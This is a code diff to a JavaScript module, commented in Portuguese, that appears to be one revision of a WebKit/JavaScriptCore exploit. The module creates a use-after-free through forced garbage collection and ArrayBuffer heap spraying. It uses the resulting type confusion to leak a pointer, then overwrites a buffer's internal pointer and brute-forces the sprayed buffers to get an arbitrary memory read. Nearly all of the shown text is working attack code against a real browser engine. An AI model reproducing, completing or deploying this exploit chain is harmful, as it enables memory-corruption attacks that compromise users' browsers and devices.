@@ -1,9 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R56 - GC Domado)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R57 - Abuso Direto e Força Bruta)
 // =======================================================================================
-// ESTA VERSÃO SE CONCENTRA EM CORRIGIR O CRASH CAUSADO PELA FUNÇÃO triggerGC_Hyper.
-// A lógica do exploit do R55 estava correta, mas nunca era alcançada.
-// - A função triggerGC_Hyper foi "domada" para ser menos agressiva, reduzindo o
-//   número de alocações e impondo um limite de tamanho para evitar esgotar a memória do sistema.
+// O R56 provou que o UAF funciona. A falha está em identificar o buffer corrompido.
+// ESTA VERSÃO MUDA A ESTRATÉGIA DA FASE 6:
+// - Abandona a tentativa de identificar o buffer corrompido de antemão.
+// - "Atira no escuro": realiza a escrita arbitrária usando a referência confusa.
+// - Procura pelo resultado: faz um loop por todos os buffers pulverizados para encontrar
+//   aquele que agora lê do endereço de memória alvo.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,7 +19,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Tamed_GC";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R57_Direct_Abuse";
 
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
@@ -30,11 +32,11 @@ function int64ToDouble(int64) {
 
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R56 - Tamed GC)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R57 - Direct Abuse)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: GC Domado (R56) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Abuso Direto (R57) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
@@ -42,37 +44,28 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const SPRAY_BUFFER_SIZE = 136;
 
     try {
+        // FASES 1-5: Mantidas do R56, pois estavam funcionando perfeitamente.
         logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
-        await triggerGC_Tamed(); // Nova função de GC, menos agressiva
-
+        await triggerGC_Tamed();
         logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
-        dangling_ref = sprayAndCreateDanglingPointer(); 
+        dangling_ref = sprayAndCreateDanglingPointer();
         logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
-        
         logS3("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
         await triggerGC_Tamed();
         await PAUSE_S3(100);
         await triggerGC_Tamed();
         logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
-
         logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
         for (let i = 0; i < 1024; i++) {
-            const buf = new ArrayBuffer(SPRAY_BUFFER_SIZE); 
-            const view = new BigUint64Array(buf);
-            view[0] = 0x4141414141414141n;
-            view[1] = 0x4242424242424242n;
+            const buf = new ArrayBuffer(SPRAY_BUFFER_SIZE);
             spray_buffers.push(buf);
         }
-        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando a confusão de tipos...`, "info");
-
+        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
         logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
-
         if (typeof dangling_ref.corrupted_prop !== 'number') {
             throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
         }
-        
         logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
-
         const leaked_ptr_double = dangling_ref.corrupted_prop;
         const buf_conv = new ArrayBuffer(8);
         (new Float64Array(buf_conv))[0] = leaked_ptr_double;
@@ -80,30 +73,40 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
         logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
         
-        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
+        // FASE 6: Abuso Direto e Verificação por Força Bruta
+        logS3("--- FASE 6: Abuso Direto da Referência Confusa ---", "subtest");
         
-        let corrupted_buffer = null;
-        logS3("    Procurando por buffer com byteLength corrompido...", "info");
+        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000");
+        
+        logS3(`    Escrevendo no ponteiro interno de um buffer desconhecido via 'dangling_ref.prop_b'...`, "info");
+        dangling_ref.prop_b = int64ToDouble(target_address_to_read);
+
+        logS3("    Verificando todos os buffers pulverizados pelo resultado da escrita...", "info");
+        let read_value = null;
+        let success = false;
         for (const buf of spray_buffers) {
-            if (buf.byteLength !== SPRAY_BUFFER_SIZE) {
-                logS3(`Encontrado buffer corrompido! Tamanho esperado: ${SPRAY_BUFFER_SIZE}, Tamanho encontrado: ${buf.byteLength}`, "good");
-                corrupted_buffer = buf;
-                break;
+            try {
+                // Se este for o buffer corrompido, a view agora aponta para o target_address.
+                // Se não for, ela aponta para um buffer vazio e a leitura será 0.
+                const hacked_view = new DataView(buf);
+                const val = hacked_view.getUint32(0, true);
+
+                // 0x464C457F é a assinatura "ELF" de executáveis. É um bom alvo.
+                if (val === 0x464c457f || val !== 0) { 
+                    logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
+                    logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(val)}`, "leak");
+                    read_value = val;
+                    success = true;
+                    break; // Saímos do loop assim que encontrarmos
+                }
+            } catch (e) {
+                // Ignora erros, pois alguns buffers podem se tornar inválidos
             }
         }
 
-        if (!corrupted_buffer) {
-            throw new Error("Não foi possível encontrar o buffer corrompido entre os pulverizados (verificação de byteLength).");
+        if (!success) {
+            throw new Error("A escrita arbitrária foi realizada, mas nenhum buffer retornou o valor esperado.");
         }
-
-        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000");
-        dangling_ref.prop_b = int64ToDouble(target_address_to_read);
-
-        const hacked_view = new DataView(corrupted_buffer);
-        const read_value = hacked_view.getUint32(0, true); 
-
-        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
-        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");
 
         final_result = { 
             success: true, 
@@ -127,19 +130,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 
-// --- Funções Auxiliares ---
-
-// *** MUDANÇA R56: Função de GC "Domada" (Tamed) ***
+// --- Funções Auxiliares (sem alterações do R56) ---
 async function triggerGC_Tamed() {
     logS3("    Acionando GC Domado (Tamed)...", "info");
     try {
         const gc_trigger_arr = [];
-        // Loop reduzido e tamanho da alocação limitado para evitar crash
         for (let i = 0; i < 500; i++) {
-            // Limita cada alocação a um máximo de 1MB
             const size = Math.min(1024 * i, 1024 * 1024);
             gc_trigger_arr.push(new ArrayBuffer(size)); 
-            gc_trigger_arr.push(new Array(size / 8).fill(0)); // Ajustado para evitar alocação excessiva
+            gc_trigger_arr.push(new Array(size / 8).fill(0));
         }
     } catch (e) {
         logS3("    Memória esgotada durante o GC Domado, o que é esperado e bom.", "info");
